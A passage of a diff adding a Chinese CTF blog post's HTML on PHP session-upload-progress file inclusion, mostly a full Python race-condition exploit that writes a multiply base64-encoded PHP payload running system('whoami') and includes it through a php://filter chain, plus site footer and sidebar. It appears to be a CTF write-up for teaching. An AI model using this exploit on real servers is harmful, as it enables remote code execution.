+<p>3.可能在解密过程中session文件后面部份，并不是全部可控的部分，可能会出现<code>=</code>，会导致解码失败，这种情况尝试更改我们上传文件的参数，比如文件名，文件长度之类的。多试几遍</p>
+</blockquote>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;upload_progress_&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_for_b64</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;%s&#x27;</span> %i <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="built_in">len</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    temp_str = <span class="built_in">str</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (valid_for_b64(temp_str))%<span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(temp_str) !=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            temp_str = base64.b64decode(temp_str)</span><br><span class="line">            t += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment">#print(e)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;=&#x27;</span> <span class="keyword">in</span> temp_str:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(temp_str) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>,t)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    ext_num = <span class="number">4</span>-(valid_for_b64(<span class="built_in">str</span>)%<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        temp_str = <span class="built_in">str</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ext_num):</span><br><span class="line">            temp_str = temp_str + random.choice(alphabet)</span><br><span class="line">        result=test(temp_str)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result != <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> (temp_str,result[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">result = get_payload(prefix)</span><br><span class="line">new_prefix = result[<span class="number">0</span>]</span><br><span class="line">decode_times = result[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">&quot;[*]需要decode的次数：%i&quot;</span>%decode_times)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">b&#x27;&#x27;&#x27;@&lt;?php</span></span><br><span class="line"><span class="string">echo &quot;nappingC4t&quot;;</span></span><br><span class="line"><span class="string">system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_b64_poc</span>(<span class="params">poc</span>):</span></span><br><span class="line">    poc_ext = <span class="number">3</span>**decode_times-(<span class="built_in">len</span>(poc)%(<span class="number">3</span>**decode_times))</span><br><span class="line">    poc = poc + <span class="string">b&#x27;a&#x27;</span>*poc_ext</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(decode_times):</span><br><span class="line">        poc = base64.b64encode(poc)</span><br><span class="line">    <span class="keyword">return</span> poc</span><br><span class="line">poc = get_b64_poc(poc)</span><br><span class="line">payload = new_prefix[-<span class="number">2</span>:] + <span class="built_in">str</span>(poc, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;[*]PHP_SESSION_UPLOAD_PROGRESS：%s&quot;</span>% payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/1.php&#x27;</span></span><br><span class="line">    f = io.BytesIO(<span class="string">b&#x27;b&#x27;</span>*<span class="number">1024</span>*<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:payload&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ccc.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;c4t&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/1.php?orange=php://filter/&#x27;</span>+<span class="string">&#x27;convert.base64-decode|&#x27;</span>*(decode_times-<span class="number">1</span>)+<span class="string">&#x27;convert.base64-decode/resource=/tmp/sess_c4t&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url,data=&#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;nappingC4t&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/zip%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag"># zip伪协议</a>
+              <a href="/tags/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6getshell/" rel="tag"># 包含session文件getshell</a>
+              <a href="/tags/%E7%95%B8%E5%BD%A2zip/" rel="tag"># 畸形zip</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/14/%E8%99%8E%E7%AC%A6CTF-2021-Internal-System/" rel="prev" title="虎符CTF 2021 Internal System">
+      <i class="fa fa-chevron-left"></i> 虎符CTF 2021 Internal System
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-number">1.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-zip%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-number">2.</span> <span class="nav-text">0x02 zip文件结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">0x03 非预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04 预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-hitcon2018-One-Line-PHP-Challenge"><span class="nav-number">5.</span> <span class="nav-text">0x05 hitcon2018 One Line PHP Challenge</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">nappingCat</p>
+  <div class="site-description" itemprop="description">2571374157@qq.com</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nappingCat</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
